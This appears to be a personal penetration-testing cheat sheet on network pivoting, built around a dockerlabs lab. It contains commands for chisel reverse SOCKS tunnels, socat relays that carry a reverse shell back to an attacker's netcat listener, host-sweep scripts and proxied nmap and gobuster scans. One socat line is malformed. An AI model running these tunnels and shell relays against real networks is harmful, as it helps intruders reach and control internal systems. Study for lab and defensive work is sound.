# Pivoting


It could be handy to have the executables to share between every new machine:
- <https://github.com/andrew-d/static-binaries>







##############################################################
## Example
(Taken from dockerlabs.es "LittlePivoting")

### Step 1
Attacker machine:
chisel server --reverse -p 1111
Add `socks5  127.0.0.1 1080` to `/etc/proxychains4.conf`

victim 1:
chisel client [ATTACKER IP]:1111 R:socks


### Step 2
victim 1:
socat TCP-LISTEN:2222,fork TCP:[ATTACKER IP]:1111

attacker machine:
Add `socks5  127.0.0.1 2222` to `/etc/proxychains4.conf`

victim 2:
chisel client [VICTIM 1 IP]:2222 R:2222:socks

- Now we can access both victim 1 and victim 2 machines from the attacker machine!

### Step 3:
victim 2:
socat TCP-LISTEN:3333,fork TCP:[VICTIM 1 IP]:4444

victim 1:
socat TCP-LISTEN:4444,fork TCP:[ATTACKER IP]:5555

attacker machine:
nc -lvnp 5555

victim 3:
payload: reverse shell to port 3333




##############################################################






## SSHuttle
- <https://www.youtube.com/watch?v=1BLAeXOQOl4>







## chisel
- <https://github.com/jpillora/chisel>

Note: depending on the environment, the latest version may not work.

```
# listen from attacker machine
chisel server --reverse -p [PORT NUMBER]

# from victim machine 1
chisel client [ATTACKER IP]:[PORT NUMBER] R:socks


```



### Proxychains
- dynamic_chain: Uses proxies in the order they appear in the list. All proxies in the chain must be available.
- random_chain: Chooses a random proxy from the list for each connection.
- static_chain: Uses proxies in the exact order they are listed.


unset `strict_chain`` and set `dynamic_chain` in `/etc/proxychains.conf`
at the end of proxychains.conf add `socks5 127.0.0.1 [tunnel PORT]`
Note: Tunnel port is 1080 by default
also in the firefox:
- manual proxy configuration > Sock Host: 127.0.0.1 Port: [tunnel PORT]
or
- set foxy proxy
or
- launch it using `proxychains -q firefox`	









## Enumeration

### see active hosts pwned machines
```bash

hostname -I


# script 1
#!/bin/bash
for i in {1..255}; do
        timeout 1 bash -c "ping -c 1 20.20.20.$i" >/dev/null
        if [ $? -eq 0 ]; then
                echo "El host 20.20.20.$i estÃ¡ activo"
        fi
done


# script 2 (in case ping is not installed)
#!/bin/bash

for host in $(seq 1 254); do
	timeout 1 bash -c "echo '' > /dev/tcp/30.30.30.$host/80 &> /dev/null" &&
	echo "30.30.30.$host";
done; wait
	
```

### nmap
```

proxychains nmap -sn -n x.x.x.0/24 
sudo proxychains -q nmap -p [PORT NUMBER] -sCVT -Pn -n [IP]	
proxychains nmap -sCVT 20.20.20.0/24 2>/dev/null
```



### gobuster
```
gobuster dir -u http://20.20.20.3 \
	-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
	-x php,doc,html,txt \
	--proxy socks5://127.0.0.1:1080
```










## socat
On Windows use `netsh`



# Scenario: this machine(n2) is the pivot and want to redirect the chisel client to the attacker chisel server listening on port 1234 on machine(n1)
```
# on machine n3
chisel client [IP machine n2]:1111 R:1111:socks
# on machine n2
socat TCP-LISTEN:1111,fork TCP:1111:1234
# on machine n1
echo -e "socks5 127.0.0.1 1111" | sudo tee -a /etc/proxychains4.conf
```
